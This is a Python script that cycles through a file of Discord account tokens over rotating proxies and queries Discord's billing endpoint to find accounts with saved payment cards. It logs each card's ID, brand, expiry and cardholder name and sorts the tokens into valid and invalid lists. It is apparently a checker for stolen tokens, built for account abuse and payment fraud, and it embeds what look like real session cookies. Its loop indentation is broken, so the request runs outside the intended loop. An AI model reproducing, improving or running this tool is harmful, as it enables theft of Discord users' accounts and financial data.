import requests
import random
import json
import threading
import urllib3
from pystyle import Write, System, Colors, Colorate, Anime
from colorama import Fore as f
import datetime
import requests
import random
import time
import threading
import httpx
from capmonster_python import HCaptchaTask
import time, re
from requests import Session
import string
from fake_useragent import UserAgent
from colorama import Fore as f
from pystyle import Write, System, Colors, Colorate, Anime
from colorama import Fore as f
from colorama import Fore
import os, random, string, time, json, sys, ctypes
import datetime
from json        import dumps






def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee


def get_random_proxy():
    with open('proxies.txt', 'r') as f:
        proxies = f.readlines()
    return random.choice(proxies).strip()



def main():
    for _ in range(50):
        time_rn = get_time_rn()
        with open('tokens.txt', 'r') as token_file:
            tokens = token_file.readlines()

        token = random.choice(tokens).strip()
        url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
        headers = {
        "accept": "*/*",
        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": token,
        "cookie": "__dcfduid=fc3074b00ae411ef87d4bf2ee41827ef; __sdcfduid=fc3074b10ae411ef87d4bf2ee41827ef32065efb6fb2bee722531f730b188092f304e5a2fa1a5bef60cf9500c8df5864; cf_clearance=mtNE._BR5vDCYdbo6n8swRr39A3hqxrShbSETr7YyFA-1714916408-1.0.1.1-GVHthlmu_cYhQBb1Rt5SSnEr7Nnq464aNZA4LpvY.nPuCrgrzEuQ_zQWXj4aGeR3e4A.8v8TorTFnISy6Aa47g; _ga=GA1.1.727073905.1715782977; OptanonConsent=isIABGlobal=false&datestamp=Wed+May+15+2024+16%3A22%3A57+GMT%2B0200+(Central+European+Summer+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A0%2CC0003%3A0; _ga_YL03HBJY7E=GS1.1.1715782976.1.0.1715782978.0.0.0; _ga_5CWMJQ1S0X=GS1.1.1715783521.1.1.1715783546.0.0.0; __cfruid=c69eae31b56739d0927fc0267d7d2a3f9e123f01-1715873293; _cfuvid=SIZbQpU5bb_ni6.SV75yhF2OkLCFSuHBfHgPtqiZoZU-1715873293066-0.0.1.1-604800000; cf_clearance=PXzn92Pdj_jXXOihnaMXInIVN2paJgSnj_v4bE4GPt4-1715873295-1.0.1.1-_KBDxUTH50xfXbTqHvSiDtMH9U1.SfJnBbBmJeRGV4ePZmWROedTuhqAo7lz8R6hEiizKJJm9SxJwktQZt.qhQ",
        "priority": "u=1, i",
        "referer": "https://discord.com/channels/868496249001746443",
        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "de",
        "x-discord-timezone": "Europe/Berlin",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlLURFIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTI0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI5Mzc0NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ=="
    }
    
    proxy = get_random_proxy()
    proxies = {"https": "http://" + proxy}  # Assuming your proxies are HTTP, change if needed
    response = requests.get(url, headers=headers, proxies=proxies)

    if response.status_code == 200:
        data = response.json()
        if data and "id" in data[0] and "brand" in data[0]:
            card_data = data[0]
            with open('valid.txt', 'a') as valid_file:
                valid_file.write(token + '\n')
            print(f"{Fore.MAGENTA}[{time_rn}] [{Fore.RED}Card Info{Fore.MAGENTA}]{Fore.WHITE} Token : {token} ID: {card_data['id']}, Brand: {card_data['brand']}, Invalid: {card_data.get('invalid', 'N/A')}, Expires Month: {card_data.get('expires_month', 'N/A')}, Expires Year: {card_data.get('expires_year', 'N/A')}, Name: {card_data.get('name', 'N/A')} \u2705")
        else:
            with open('invalid.txt', 'a') as invalid_file:
                invalid_file.write(token + '\n')
            print(f"{Fore.MAGENTA}[{time_rn}] [{Fore.RED}Invalid{Fore.MAGENTA}]{Fore.WHITE} No Cards \u274c")

threads = []
for _ in range(10):
    thread = threading.Thread(target=main)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join() 
